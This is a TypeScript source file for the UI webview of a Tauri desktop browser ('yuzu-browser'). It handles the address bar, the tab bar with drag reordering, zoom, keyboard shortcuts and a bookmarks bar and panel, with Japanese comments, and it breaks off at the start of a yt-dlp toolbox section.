// yuzu-browser UI — アドレスバー + タブバー専用 webview。
// 表示は別 view webview（タブごと）が担当し、こちらは Tauri の invoke で操作する。

import { invoke } from "@tauri-apps/api/core";
import { listen } from "@tauri-apps/api/event";

const HOME_URL = "https://duckduckgo.com/";
const SEARCH_URL = "https://duckduckgo.com/?q=";

interface TabInfo {
  id: number;
  url: string;
  title: string;
  active: boolean;
  muted: boolean;
  audible: boolean;
  favicon: string;
}

let input: HTMLInputElement;
let tabsEl: HTMLDivElement;
let userTyping = false;
let tabs: TabInfo[] = [];

/** 入力を URL に解決。URL らしくなければ DuckDuckGo 検索 URL にフォールバック。 */
function resolveQuery(raw: string): string {
  const q = raw.trim();
  if (!q) return HOME_URL;
  if (/^[a-z][a-z0-9+.-]*:\/\//i.test(q)) return q;
  if (/^(localhost|127\.0\.0\.1)(:\d+)?(\/.*)?$/i.test(q)) return "http://" + q;
  if (!/\s/.test(q) && /^[^\s/?#]+\.[a-z]{2,}([/:?#].*)?$/i.test(q)) {
    return "https://" + q;
  }
  return SEARCH_URL + encodeURIComponent(q);
}

function activeTab(): TabInfo | undefined {
  return tabs.find((t) => t.active);
}

async function navigate(url: string): Promise<void> {
  input.value = url;
  try {
    await invoke("browser_navigate", { url });
  } catch (e) {
    console.error("navigate failed:", e);
  }
}

async function history(action: "back" | "forward" | "reload"): Promise<void> {
  try {
    await invoke("browser_history", { action });
  } catch (e) {
    console.error("history failed:", e);
  }
}

async function tabNew(url?: string): Promise<void> {
  try {
    await invoke("tab_new", { url: url ?? HOME_URL });
  } catch (e) {
    console.error("tab_new failed:", e);
  }
}

async function tabClose(id: number): Promise<void> {
  try {
    await invoke("tab_close", { id });
  } catch (e) {
    console.error("tab_close failed:", e);
  }
}

async function tabSwitch(id: number): Promise<void> {
  try {
    await invoke("tab_switch", { id });
  } catch (e) {
    console.error("tab_switch failed:", e);
  }
}

async function tabDuplicate(id: number): Promise<void> {
  try {
    await invoke("tab_duplicate", { id });
  } catch (e) {
    console.error("tab_duplicate failed:", e);
  }
}

async function tabReopen(): Promise<void> {
  try {
    await invoke("tab_reopen");
  } catch (e) {
    console.error("tab_reopen failed:", e);
  }
}

async function tabCloseOthers(id: number): Promise<void> {
  try {
    await invoke("tab_close_others", { id });
  } catch (e) {
    console.error("tab_close_others failed:", e);
  }
}

async function tabCloseRight(id: number): Promise<void> {
  try {
    await invoke("tab_close_right", { id });
  } catch (e) {
    console.error("tab_close_right failed:", e);
  }
}

async function tabReorder(id: number, toIndex: number): Promise<void> {
  try {
    await invoke("tab_reorder", { id, toIndex });
  } catch (e) {
    console.error("tab_reorder failed:", e);
  }
}

/** 表示用のタブ名を作る。ページタイトルがあればそれ、なければホスト名。 */
function tabLabel(t: TabInfo): string {
  if (t.title && t.title.trim()) return t.title;
  return urlToTitle(t.url);
}

/** URL からタイトル文字列を作る（ホスト名）。 */
function urlToTitle(url: string): string {
  try {
    const u = new URL(url);
    if (u.hostname) return u.hostname.replace(/^www\./, "");
    return url;
  } catch {
    return url || "新しいタブ";
  }
}

/** バックエンドが favicon を取得できていないときの推測 URL。 */
function faviconFallback(url: string): string {
  try {
    const u = new URL(url);
    if (u.protocol !== "http:" && u.protocol !== "https:") return "";
    return `${u.origin}/favicon.ico`;
  } catch {
    return "";
  }
}

/** 1x1 透明 PNG (壊れた img の代わりに使う)。 */
const TRANSPARENT_PIXEL =
  "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkAAIAAAoAAv/lxKUAAAAASUVORK5CYII=";

/** favicon img に段階的フォールバック (favicon → /favicon.ico → 透明) を仕込む。
 * load 失敗をブラウザの「壊れた画像」アイコンで見せないために、
 * 必ず error ハンドラを src 設定より前に登録する。 */
function setupCascadingFavicon(
  img: HTMLImageElement,
  primary: string,
  pageUrl: string,
): void {
  const fallback1 = faviconFallback(pageUrl);
  const candidates: string[] = [];
  if (primary) candidates.push(primary);
  if (fallback1 && !candidates.includes(fallback1)) candidates.push(fallback1);
  let idx = 0;
  img.addEventListener("error", () => {
    idx += 1;
    if (idx < candidates.length) {
      img.src = candidates[idx];
    } else {
      // すべて失敗 → 透明ピクセルに置き換えて灰色プレースホルダを表示。
      img.classList.add("is-fallback");
      img.src = TRANSPARENT_PIXEL;
    }
  });
  if (candidates.length === 0) {
    img.classList.add("is-fallback");
    img.src = TRANSPARENT_PIXEL;
  } else {
    img.src = candidates[0];
  }
}

function renderTabs(): void {
  tabsEl.innerHTML = "";
  for (const t of tabs) {
    const el = document.createElement("div");
    el.className = "tab" + (t.active ? " active" : "");
    el.dataset.id = String(t.id);
    el.title = t.url;
    // HTML5 DnD は WebView2 で挙動が不安定なので使わない (pointer events で実装)。
    el.draggable = false;

    // favicon
    const fav = document.createElement("img");
    fav.className = "tab-favicon";
    fav.alt = "";
    fav.referrerPolicy = "no-referrer";
    fav.draggable = false;
    setupCascadingFavicon(fav, t.favicon, t.url);
    el.appendChild(fav);

    const title = document.createElement("span");
    title.className = "tab-title";
    title.textContent = tabLabel(t);
    el.appendChild(title);

    // タブ内ミュートボタン：「音が鳴っている」または「ミュート中」のときだけ表示。
    if (t.audible || t.muted) {
      const mute = document.createElement("button");
      mute.className = "tab-mute" + (t.muted ? " is-muted" : "");
      mute.type = "button";
      mute.textContent = t.muted ? "🔇" : "🔊";
      mute.title = t.muted ? "ミュートを解除" : "このタブをミュート";
      mute.addEventListener("click", (e) => {
        e.stopPropagation();
        void invoke("tab_set_volume", {
          id: t.id,
          volume: t.muted ? 1.0 : 0.0,
        }).catch((err) => console.error("tab_set_volume failed:", err));
      });
      el.appendChild(mute);
    }

    const close = document.createElement("button");
    close.className = "tab-close";
    close.type = "button";
    close.textContent = "×";
    close.title = "タブを閉じる";
    close.addEventListener("click", (e) => {
      e.stopPropagation();
      void tabClose(t.id);
    });
    el.appendChild(close);

    // --- pointer event ベースのタブクリック / 並び替え / 切り離し ---
    // HTML5 DnD は WebView2 で取りこぼしが多いので使わない。
    el.addEventListener("pointerdown", (e) => {
      const pe = e as PointerEvent;
      if ((pe.target as HTMLElement).closest("button")) return;
      // 中クリックで閉じる (タブが多くて scroll container 化したとき
      // auxclick が autoscroll に取られて発火しないことがあるため
      // pointerdown で確実に処理する)
      if (pe.button === 1) {
        e.preventDefault();
        void tabClose(t.id);
        return;
      }
      if (pe.button !== 0) return;
      e.preventDefault();
      startTabDrag(t.id, el, pe);
    });
    el.addEventListener("auxclick", (e) => {
      // フォールバック (pointerdown で処理済みでも害はない)
      if ((e as MouseEvent).button === 1) {
        e.preventDefault();
      }
    });
    el.addEventListener("contextmenu", (e) => {
      e.preventDefault();
      void invoke("show_tab_context_menu", { id: t.id }).catch((err) =>
        console.error("show_tab_context_menu failed:", err),
      );
    });

    tabsEl.appendChild(el);
  }
}

/** タブの pointerdown 時に呼ばれ、ドラッグ閾値を超えたら並び替え/切り離しを行う。 */
function startTabDrag(
  tabId: number,
  el: HTMLDivElement,
  downEvt: PointerEvent,
): void {
  const startX = downEvt.clientX;
  const startY = downEvt.clientY;
  let dragging = false;
  let lastX = startX;
  let lastY = startY;

  const setDropMarkers = (x: number) => {
    document
      .querySelectorAll(".tab.drop-before, .tab.drop-after")
      .forEach((n) => n.classList.remove("drop-before", "drop-after"));
    const target = findTabAtX(x, tabId);
    if (!target) return;
    const r = target.el.getBoundingClientRect();
    const before = x < r.left + r.width / 2;
    target.el.classList.toggle("drop-before", before);
    target.el.classList.toggle("drop-after", !before);
  };

  const onMove = (ev: PointerEvent) => {
    lastX = ev.clientX;
    lastY = ev.clientY;
    if (!dragging) {
      if (
        Math.abs(ev.clientX - startX) > 5 ||
        Math.abs(ev.clientY - startY) > 5
      ) {
        dragging = true;
        el.classList.add("dragging");
      } else {
        return;
      }
    }
    setDropMarkers(ev.clientX);
  };

  const onUp = (ev: PointerEvent) => {
    window.removeEventListener("pointermove", onMove, true);
    window.removeEventListener("pointerup", onUp, true);
    window.removeEventListener("pointercancel", onCancel, true);
    document
      .querySelectorAll(".tab.drop-before, .tab.drop-after")
      .forEach((n) => n.classList.remove("drop-before", "drop-after"));
    el.classList.remove("dragging");
    if (!dragging) {
      // ただのクリック → タブ切替
      void tabSwitch(tabId);
      return;
    }
    // ドロップ位置でアクション決定
    const tabbar = document.querySelector(".tabbar");
    if (!tabbar) return;
    const rect = tabbar.getBoundingClientRect();
    const farOutside =
      ev.clientY < rect.top - 60 || ev.clientY > rect.bottom + 60;
    if (farOutside && tabs.length > 1) {
      void invoke("tab_detach", { id: tabId }).catch((err) =>
        console.error("tab_detach failed:", err),
      );
      return;
    }
    // 並び替え
    const target = findTabAtX(ev.clientX, tabId);
    if (!target) return;
    const r = target.el.getBoundingClientRect();
    const before = ev.clientX < r.left + r.width / 2;
    const fromIdx = tabs.findIndex((x) => x.id === tabId);
    if (fromIdx < 0) return;
    let to = before ? target.index : target.index + 1;
    if (fromIdx < to) to -= 1;
    if (to === fromIdx) return;
    void tabReorder(tabId, to);
  };

  const onCancel = () => {
    window.removeEventListener("pointermove", onMove, true);
    window.removeEventListener("pointerup", onUp, true);
    window.removeEventListener("pointercancel", onCancel, true);
    document
      .querySelectorAll(".tab.drop-before, .tab.drop-after")
      .forEach((n) => n.classList.remove("drop-before", "drop-after"));
    el.classList.remove("dragging");
  };

  // last* unused-warning 抑止
  void lastX;
  void lastY;

  window.addEventListener("pointermove", onMove, true);
  window.addEventListener("pointerup", onUp, true);
  window.addEventListener("pointercancel", onCancel, true);
}

/** 与えられた x 座標に最も近いタブ (自分以外) を返す。 */
function findTabAtX(
  x: number,
  selfId: number,
): { el: HTMLDivElement; index: number } | null {
  const els = Array.from(tabsEl.querySelectorAll<HTMLDivElement>(".tab"));
  let best: { el: HTMLDivElement; index: number; dist: number } | null = null;
  for (let i = 0; i < els.length; i++) {
    const e = els[i];
    if (Number(e.dataset.id) === selfId) continue;
    const r = e.getBoundingClientRect();
    let dist: number;
    if (x < r.left) dist = r.left - x;
    else if (x > r.right) dist = x - r.right;
    else dist = 0;
    if (best === null || dist < best.dist) {
      best = { el: e, index: i, dist };
    }
  }
  return best ? { el: best.el, index: best.index } : null;
}

/** ネイティブコンテキストメニューの選択結果を処理。 */
function handleTabMenuAction(action: string, id: number): void {
  switch (action) {
    case "new":
      void tabNew();
      break;
    case "duplicate":
      void tabDuplicate(id);
      break;
    case "reload":
      void tabSwitch(id).then(() => history("reload"));
      break;
    case "reopen":
      void tabReopen();
      break;
    case "close_right":
      void tabCloseRight(id);
      break;
    case "close_others":
      void tabCloseOthers(id);
      break;
    case "close":
      void tabClose(id);
      break;
  }
}

/** view webview が遷移したら、対応タブが active のときだけアドレスバーへ反映。 */
function onViewNavigated(payload: { id: number; url: string }): void {
  const t = tabs.find((x) => x.id === payload.id);
  if (t) t.url = payload.url;
  renderTabs();
  const active = activeTab();
  if (active && active.id === payload.id && !userTyping) {
    input.value = payload.url;
  }
}

function onTabsUpdated(next: TabInfo[]): void {
  tabs = next;
  renderTabs();
  const active = activeTab();
  if (active && !userTyping) {
    input.value = active.url;
  }
  // 音量・ズーム表示を active タブに同期
  if (active) {
    void syncControlsForTab(active.id);
  }
  void refreshBookmarkStar();
}

/** 指定タブのズームをツールバー UI に反映。 */
async function syncControlsForTab(_id: number): Promise<void> {
  try {
    const z = await invoke<number>("tab_get_zoom");
    if (zoomDisplayEl) zoomDisplayEl.textContent = Math.round(z * 100) + "%";
  } catch (_) {
    /* ignore */
  }
}

let zoomDisplayEl: HTMLSpanElement | null = null;

window.addEventListener("DOMContentLoaded", () => {
  input = document.getElementById("address") as HTMLInputElement;
  tabsEl = document.getElementById("tabs") as HTMLDivElement;
  const form = document.getElementById("address-form") as HTMLFormElement;
  const backBtn = document.getElementById("back") as HTMLButtonElement | null;
  const forwardBtn = document.getElementById(
    "forward",
  ) as HTMLButtonElement | null;
  const reloadBtn = document.getElementById(
    "reload",
  ) as HTMLButtonElement | null;
  const newTabBtn = document.getElementById("new-tab") as HTMLButtonElement;

  form.addEventListener("submit", (e) => {
    e.preventDefault();
    userTyping = false;
    const raw = input.value.trim();
    // "AI:質問" / "ai:質問" → AI ツールに転送して質問
    const m = raw.match(/^(?:AI|ai|Ai|aI)\s*[:：]\s*(.+)$/);
    if (m) {
      const q = m[1].trim();
      void runAIFromAddressBar(q);
      return;
    }
    void navigate(resolveQuery(raw));
  });
  input.addEventListener("input", () => {
    userTyping = true;
  });
  input.addEventListener("blur", () => {
    userTyping = false;
  });
  input.addEventListener("focus", () => {
    input.select();
  });

  backBtn?.addEventListener("click", () => void history("back"));
  forwardBtn?.addEventListener("click", () => void history("forward"));
  reloadBtn?.addEventListener("click", () => void history("reload"));
  newTabBtn.addEventListener("click", () => void tabNew());

  // タブバーへの URL ドラッグ&ドロップ → 新しいタブで開く。
  const tabbar = document.querySelector(".tabbar") as HTMLElement | null;
  if (tabbar) {
    tabbar.addEventListener("dragover", (e) => {
      const dt = (e as DragEvent).dataTransfer;
      if (!dt) return;
      // URI または text を含むドラッグだけ受け付ける。
      const types = Array.from(dt.types || []);
      if (
        types.includes("text/uri-list") ||
        types.includes("text/plain") ||
        types.includes("text/x-moz-url")
      ) {
        e.preventDefault();
        dt.dropEffect = "copy";
        tabbar.classList.add("drop-url");
      }
    });
    tabbar.addEventListener("dragleave", (e) => {
      // タブバーから完全に離れたときだけハイライト解除。
      if (e.target === tabbar) tabbar.classList.remove("drop-url");
    });
    tabbar.addEventListener("drop", (e) => {
      const dt = (e as DragEvent).dataTransfer;
      if (!dt) return;
      e.preventDefault();
      tabbar.classList.remove("drop-url");
      const raw =
        dt.getData("text/uri-list") ||
        dt.getData("text/x-moz-url") ||
        dt.getData("text/plain");
      if (!raw) return;
      // text/uri-list は複数行 (# はコメント) を含むことがある。先頭の有効行だけ採用。
      const url = raw
        .split(/\r?\n/)
        .map((s) => s.trim())
        .find((s) => s && !s.startsWith("#"));
      if (!url) return;
      void tabNew(resolveQuery(url));
    });
  }

  // ズームコントロール
  zoomDisplayEl = document.getElementById(
    "zoom-display",
  ) as HTMLSpanElement | null;
  const zoomInBtn = document.getElementById(
    "zoom-in",
  ) as HTMLButtonElement | null;
  const zoomOutBtn = document.getElementById(
    "zoom-out",
  ) as HTMLButtonElement | null;
  if (zoomInBtn) {
    zoomInBtn.addEventListener("click", () => {
      void invoke("active_tab_zoom_delta", { delta: 0.1 }).catch((e) =>
        console.error("zoom_delta failed:", e),
      );
    });
  }
  if (zoomOutBtn) {
    zoomOutBtn.addEventListener("click", () => {
      void invoke("active_tab_zoom_delta", { delta: -0.1 }).catch((e) =>
        console.error("zoom_delta failed:", e),
      );
    });
  }
  if (zoomDisplayEl) {
    zoomDisplayEl.addEventListener("click", () => {
      void invoke("active_tab_zoom_set", { zoom: 1.0 }).catch((e) =>
        console.error("zoom_set failed:", e),
      );
    });
  }

  // ページ翻訳ボタン
  setupPageTranslate();

  // UI webview 上での Ctrl+ホイール（ツールバー上など）もズームに使う
  window.addEventListener(
    "wheel",
    (e) => {
      if (!e.ctrlKey) return;
      e.preventDefault();
      const delta = e.deltaY < 0 ? 0.1 : -0.1;
      void invoke("active_tab_zoom_delta", { delta }).catch(() => {});
    },
    { passive: false },
  );

  // ショートカット
  window.addEventListener("keydown", (e) => {
    const k = e.key.toLowerCase();
    if (e.ctrlKey && !e.shiftKey && k === "t") {
      e.preventDefault();
      void tabNew();
    } else if (e.ctrlKey && e.shiftKey && k === "t") {
      e.preventDefault();
      void tabReopen();
    } else if (e.ctrlKey && k === "w") {
      e.preventDefault();
      const a = activeTab();
      if (a) void tabClose(a.id);
    } else if (e.ctrlKey && k === "l") {
      e.preventDefault();
      input.focus();
    } else if (e.ctrlKey && k === "d" && e.shiftKey) {
      // Ctrl+Shift+D でタブ複製
      e.preventDefault();
      const a = activeTab();
      if (a) void tabDuplicate(a.id);
    } else if (e.ctrlKey && k === "tab") {
      e.preventDefault();
      const idx = tabs.findIndex((t) => t.active);
      if (idx < 0 || tabs.length === 0) return;
      const next = e.shiftKey
        ? (idx - 1 + tabs.length) % tabs.length
        : (idx + 1) % tabs.length;
      void tabSwitch(tabs[next].id);
    } else if (e.ctrlKey && /^[1-9]$/.test(e.key)) {
      // Ctrl+1..8 で番号タブ、Ctrl+9 で最後のタブ
      e.preventDefault();
      const n = Number(e.key);
      const target = n === 9 ? tabs[tabs.length - 1] : tabs[n - 1];
      if (target) void tabSwitch(target.id);
    } else if (e.ctrlKey && e.key === "0") {
      e.preventDefault();
      void invoke("active_tab_zoom_set", { zoom: 1.0 }).catch(() => {});
    } else if (e.ctrlKey && (e.key === "+" || e.key === "=")) {
      e.preventDefault();
      void invoke("active_tab_zoom_delta", { delta: 0.1 }).catch(() => {});
    } else if (e.ctrlKey && e.key === "-") {
      e.preventDefault();
      void invoke("active_tab_zoom_delta", { delta: -0.1 }).catch(() => {});
    }
  });

  void listen<{ id: number; zoom: number }>("tab-zoom-changed", (event) => {
    const a = activeTab();
    if (!a || a.id !== event.payload.id) return;
    if (zoomDisplayEl)
      zoomDisplayEl.textContent = Math.round(event.payload.zoom * 100) + "%";
  });

  void listen<{ id: number; url: string }>("view-navigated", (event) => {
    onViewNavigated(event.payload);
    // ユーザースクリプト注入 (URL マッチで自動)
    void injectUserScriptsForTab(event.payload.id, event.payload.url);
  });
  void listen<TabInfo[]>("tabs-updated", (event) => {
    onTabsUpdated(event.payload);
  });
  void listen<{ action: string; id: number }>("tab-menu-action", (event) => {
    handleTabMenuAction(event.payload.action, event.payload.id);
  });

  // ===== ブックマーク UI =====
  bookmarkToggleBtn = document.getElementById(
    "bookmark-toggle",
  ) as HTMLButtonElement | null;
  const bookmarksOpenBtn = document.getElementById(
    "bookmarks-open",
  ) as HTMLButtonElement | null;
  bookmarksPanel = document.getElementById(
    "bookmarks-panel",
  ) as HTMLDivElement | null;
  bookmarksListEl = document.getElementById(
    "bookmarks-list",
  ) as HTMLUListElement | null;
  bookmarksEmptyEl = document.getElementById(
    "bookmarks-empty",
  ) as HTMLDivElement | null;
  bookmarksBarItemsEl = document.getElementById(
    "bookmarks-bar-items",
  ) as HTMLDivElement | null;
  bookmarksBarEmptyEl = document.getElementById(
    "bookmarks-bar-empty",
  ) as HTMLDivElement | null;
  bookmarksBarAddBtn = document.getElementById(
    "bookmarks-bar-add",
  ) as HTMLButtonElement | null;
  const bookmarksCloseBtn = document.getElementById(
    "bookmarks-close",
  ) as HTMLButtonElement | null;

  if (bookmarkToggleBtn) {
    bookmarkToggleBtn.addEventListener(
      "click",
      () => void toggleCurrentBookmark(),
    );
  }
  if (bookmarksBarAddBtn) {
    bookmarksBarAddBtn.addEventListener(
      "click",
      () => void toggleCurrentBookmark(),
    );
  }
  if (bookmarksOpenBtn) {
    bookmarksOpenBtn.addEventListener(
      "click",
      () =>
        void (bookmarksPanelOpen
          ? closeBookmarksPanel()
          : openBookmarksPanel()),
    );
  }
  if (bookmarksCloseBtn) {
    bookmarksCloseBtn.addEventListener(
      "click",
      () => void closeBookmarksPanel(),
    );
  }

  void listen<Bookmark[]>("bookmarks-updated", (event) => {
    bookmarks = event.payload;
    renderBookmarks();
    void refreshBookmarkStar();
  });

  // ブックマーク用ショートカット: Ctrl+D で追加/削除、Ctrl+B で一覧表示
  window.addEventListener("keydown", (e) => {
    const k = e.key.toLowerCase();
    if (e.ctrlKey && !e.shiftKey && k === "d") {
      e.preventDefault();
      void toggleCurrentBookmark();
    } else if (e.ctrlKey && !e.shiftKey && k === "b") {
      e.preventDefault();
      void (bookmarksPanelOpen ? closeBookmarksPanel() : openBookmarksPanel());
    } else if (k === "escape" && bookmarksPanelOpen) {
      e.preventDefault();
      void closeBookmarksPanel();
    }
  });

  // 初期ブックマークロード
  void invoke<Bookmark[]>("bookmark_list")
    .then((list) => {
      bookmarks = list;
      renderBookmarks();
      void refreshBookmarkStar();
    })
    .catch((e) => console.error("bookmark_list failed:", e));

  // ツールボックス UI を初期化
  void setupToolbox();

  // 初期タブリスト取得
  void invoke<TabInfo[]>("tab_list")
    .then(onTabsUpdated)
    .catch((e) => {
      console.error("tab_list failed:", e);
    });
});

// ===== ブックマーク =====

interface Bookmark {
  id: number;
  url: string;
  title: string;
  favicon: string;
}

let bookmarks: Bookmark[] = [];
let bookmarkToggleBtn: HTMLButtonElement | null = null;
let bookmarksPanel: HTMLDivElement | null = null;
let bookmarksListEl: HTMLUListElement | null = null;
let bookmarksEmptyEl: HTMLDivElement | null = null;
let bookmarksBarItemsEl: HTMLDivElement | null = null;
let bookmarksBarEmptyEl: HTMLDivElement | null = null;
let bookmarksBarAddBtn: HTMLButtonElement | null = null;
let bookmarksPanelOpen = false;

async function toggleCurrentBookmark(): Promise<void> {
  const a = activeTab();
  if (!a) return;
  const existing = bookmarks.find((b) => b.url === a.url);
  try {
    if (existing) {
      await invoke("bookmark_remove", { id: existing.id });
    } else {
      await invoke("bookmark_add", {});
    }
  } catch (e) {
    console.error("toggle bookmark failed:", e);
  }
}

async function refreshBookmarkStar(): Promise<void> {
  const a = activeTab();
  const isMarked = !!a && bookmarks.some((b) => b.url === a.url);
  if (bookmarkToggleBtn) {
    bookmarkToggleBtn.textContent = isMarked ? "★" : "☆";
    bookmarkToggleBtn.classList.toggle("is-bookmarked", isMarked);
    bookmarkToggleBtn.title = isMarked
      ? "このページのブックマークを削除 (Ctrl+D)"
      : "このページをブックマーク (Ctrl+D)";
  }
  if (bookmarksBarAddBtn) {
    bookmarksBarAddBtn.textContent = isMarked ? "★" : "☆";
    bookmarksBarAddBtn.classList.toggle("is-bookmarked", isMarked);
    bookmarksBarAddBtn.title = isMarked
      ? "このページのブックマークを削除 (Ctrl+D)"
      : "このページをブックマーク (Ctrl+D)";
  }
}

/** ブックマーク行の favicon URL を解決。
 * 1) ブックマーク自身の favicon
 * 2) 同じ URL のタブが開いていればそのタブの最新 favicon
 * 3) {origin}/favicon.ico フォールバック
 */
function resolveBookmarkFavicon(b: Bookmark): string {
  if (b.favicon) return b.favicon;
  const matched = tabs.find((t) => t.url === b.url && t.favicon);
  if (matched) return matched.favicon;
  return faviconFallback(b.url);
}

/** Chrome 風のブックマークバー (tabbar の下に常時表示) を描画。 */
function renderBookmarksBar(): void {
  if (!bookmarksBarItemsEl || !bookmarksBarEmptyEl) return;
  bookmarksBarItemsEl.innerHTML = "";
  if (bookmarks.length === 0) {
    bookmarksBarEmptyEl.hidden = false;
    return;
  }
  bookmarksBarEmptyEl.hidden = true;
  for (let i = 0; i < bookmarks.length; i++) {
    const b = bookmarks[i];
    const el = document.createElement("div");
    el.className = "bookmarks-bar-item";
    el.dataset.id = String(b.id);
    el.title = `${b.title || b.url}\n${b.url}`;

    const fav = document.createElement("img");
    fav.className = "bb-favicon";
    fav.alt = "";
    fav.referrerPolicy = "no-referrer";
    fav.draggable = false;
    setupCascadingFavicon(fav, resolveBookmarkFavicon(b), b.url);
    el.appendChild(fav);

    const title = document.createElement("span");
    title.className = "bb-title";
    title.textContent = b.title || urlToTitle(b.url);
    el.appendChild(title);

    // pointer event ベースのクリック/並び替え
    el.addEventListener("pointerdown", (e) => {
      const pe = e as PointerEvent;
      if (pe.button !== 0) return;
      e.preventDefault();
      startBookmarkDrag(b.id, b.url, el, pe);
    });
    el.addEventListener("auxclick", (e) => {
      if ((e as MouseEvent).button === 1) {
        e.preventDefault();
        void tabNew(b.url);
      }
    });
    el.addEventListener("contextmenu", (e) => {
      e.preventDefault();
      if (confirm(`このブックマークを削除しますか?\n\n${b.title || b.url}`)) {
        void invoke("bookmark_remove", { id: b.id }).catch((err) =>
          console.error("bookmark_remove failed:", err),
        );
      }
    });

    bookmarksBarItemsEl.appendChild(el);
  }
}

/** ブックマークバー項目の pointerdown 時に呼ばれ、閾値超えで並び替え。 */
function startBookmarkDrag(
  bmId: number,
  bmUrl: string,
  el: HTMLDivElement,
  downEvt: PointerEvent,
): void {
  const startX = downEvt.clientX;
  const startY = downEvt.clientY;
  const ctrlAtDown = downEvt.ctrlKey || downEvt.metaKey;
  let dragging = false;

  const clearMarkers = () => {
    document
      .querySelectorAll(
        ".bookmarks-bar-item.drop-before, .bookmarks-bar-item.drop-after",
      )
      .forEach((n) => n.classList.remove("drop-before", "drop-after"));
  };

  const setDropMarkers = (x: number) => {
    clearMarkers();
    const target = findBookmarkAtX(x, bmId);
    if (!target) return;
    const r = target.el.getBoundingClientRect();
    const before = x < r.left + r.width / 2;
    target.el.classList.toggle("drop-before", before);
    target.el.classList.toggle("drop-after", !before);
  };

  const onMove = (ev: PointerEvent) => {
    if (!dragging) {
      if (
        Math.abs(ev.clientX - startX) > 5 ||
        Math.abs(ev.clientY - startY) > 5
      ) {
        dragging = true;
        el.classList.add("dragging");
      } else {
        return;
      }
    }
    setDropMarkers(ev.clientX);
  };

  const onUp = (ev: PointerEvent) => {
    window.removeEventListener("pointermove", onMove, true);
    window.removeEventListener("pointerup", onUp, true);
    window.removeEventListener("pointercancel", onCancel, true);
    clearMarkers();
    el.classList.remove("dragging");
    if (!dragging) {
      // 通常クリック → 開く
      if (ctrlAtDown) {
        void tabNew(bmUrl);
      } else {
        void navigate(bmUrl);
      }
      return;
    }
    // ドロップ → 並び替え
    const target = findBookmarkAtX(ev.clientX, bmId);
    if (!target) return;
    const r = target.el.getBoundingClientRect();
    const before = ev.clientX < r.left + r.width / 2;
    const fromIdx = bookmarks.findIndex((x) => x.id === bmId);
    if (fromIdx < 0) return;
    let to = before ? target.index : target.index + 1;
    if (fromIdx < to) to -= 1;
    if (to === fromIdx) return;
    void invoke("bookmark_reorder", { id: bmId, toIndex: to }).catch((err) =>
      console.error("bookmark_reorder failed:", err),
    );
  };

  const onCancel = () => {
    window.removeEventListener("pointermove", onMove, true);
    window.removeEventListener("pointerup", onUp, true);
    window.removeEventListener("pointercancel", onCancel, true);
    clearMarkers();
    el.classList.remove("dragging");
  };

  window.addEventListener("pointermove", onMove, true);
  window.addEventListener("pointerup", onUp, true);
  window.addEventListener("pointercancel", onCancel, true);
}

/** 与えられた x 座標に最も近いブックマーク項目 (自分以外) を返す。 */
function findBookmarkAtX(
  x: number,
  selfId: number,
): { el: HTMLDivElement; index: number } | null {
  if (!bookmarksBarItemsEl) return null;
  const els = Array.from(
    bookmarksBarItemsEl.querySelectorAll<HTMLDivElement>(".bookmarks-bar-item"),
  );
  let best: { el: HTMLDivElement; index: number; dist: number } | null = null;
  for (let i = 0; i < els.length; i++) {
    const e = els[i];
    if (Number(e.dataset.id) === selfId) continue;
    const r = e.getBoundingClientRect();
    let dist: number;
    if (x < r.left) dist = r.left - x;
    else if (x > r.right) dist = x - r.right;
    else dist = 0;
    if (best === null || dist < best.dist) {
      best = { el: e, index: i, dist };
    }
  }
  return best ? { el: best.el, index: best.index } : null;
}

function renderBookmarks(): void {
  renderBookmarksBar();
  if (!bookmarksListEl || !bookmarksEmptyEl) return;
  bookmarksListEl.innerHTML = "";
  if (bookmarks.length === 0) {
    bookmarksEmptyEl.hidden = false;
    return;
  }
  bookmarksEmptyEl.hidden = true;
  for (const b of bookmarks) {
    const li = document.createElement("li");
    li.className = "bookmark-item";

    const fav = document.createElement("img");
    fav.className = "bookmark-favicon";
    fav.alt = "";
    fav.referrerPolicy = "no-referrer";
    setupCascadingFavicon(fav, resolveBookmarkFavicon(b), b.url);
    li.appendChild(fav);

    const text = document.createElement("div");
    text.className = "bookmark-text";
    const title = document.createElement("span");
    title.className = "bookmark-title";
    title.textContent = b.title || b.url;
    const url = document.createElement("span");
    url.className = "bookmark-url";
    url.textContent = b.url;
    text.appendChild(title);
    text.appendChild(url);
    li.appendChild(text);

    const rm = document.createElement("button");
    rm.className = "bookmark-remove";
    rm.type = "button";
    rm.title = "削除";
    rm.textContent = "×";
    rm.addEventListener("click", (e) => {
      e.stopPropagation();
      void invoke("bookmark_remove", { id: b.id }).catch((err) =>
        console.error("bookmark_remove failed:", err),
      );
    });
    li.appendChild(rm);

    li.addEventListener("click", () => {
      void closeBookmarksPanel().then(() => tabNew(b.url));
    });
    li.addEventListener("auxclick", (e) => {
      // 中クリックで現在のタブを保ったまま新規タブで開く
      if ((e as MouseEvent).button === 1) {
        e.preventDefault();
        void tabNew(b.url);
      }
    });

    bookmarksListEl.appendChild(li);
  }
}

async function openBookmarksPanel(): Promise<void> {
  if (!bookmarksPanel) return;
  try {
    await invoke("ui_set_expanded", { expanded: true });
  } catch (e) {
    console.error("ui_set_expanded failed:", e);
  }
  bookmarksPanel.hidden = false;
  bookmarksPanelOpen = true;
  // 最新を取得して描画
  try {
    bookmarks = await invoke<Bookmark[]>("bookmark_list");
    renderBookmarks();
  } catch (e) {
    console.error("bookmark_list failed:", e);
  }
}

async function closeBookmarksPanel(): Promise<void> {
  if (!bookmarksPanel) return;
  bookmarksPanel.hidden = true;
  bookmarksPanelOpen = false;
  try {
    await invoke("ui_set_expanded", { expanded: false });
  } catch (e) {
    console.error("ui_set_expanded failed:", e);
  }
}

// ===== ツールボックス =====

interface ToolboxSettings {
  download_dir: string;
}

let toolboxPanel: HTMLDivElement | null = null;
let toolboxOpen = false;
let ytdlpRunBtn: HTMLButtonElement | null = null;
let ytdlpCancelBtn: HTMLButtonElement | null = null;
let ytdlpUrlInput: HTMLInputElement | null = null;
let ytdlpDirInput: HTMLInputElement | null = null;
let ytdlpModeSel: HTMLSelectElement | null = null;
let ytdlpQualitySel: HTMLSelectElement | null = null;
let ytdlpLogEl: HTMLPreElement | null = null;
let ytdlpStatusEl: HTMLSpanElement | null = null;
let ytdlpFillBtn: HTMLButtonElement | null = null;
let ytdlpPickDirBtn: HTMLButtonElement | null = null;
let toolboxOpenBtn: HTMLButtonElement | null = null;
let toolboxCloseBtn: HTMLButtonElement | null = null;
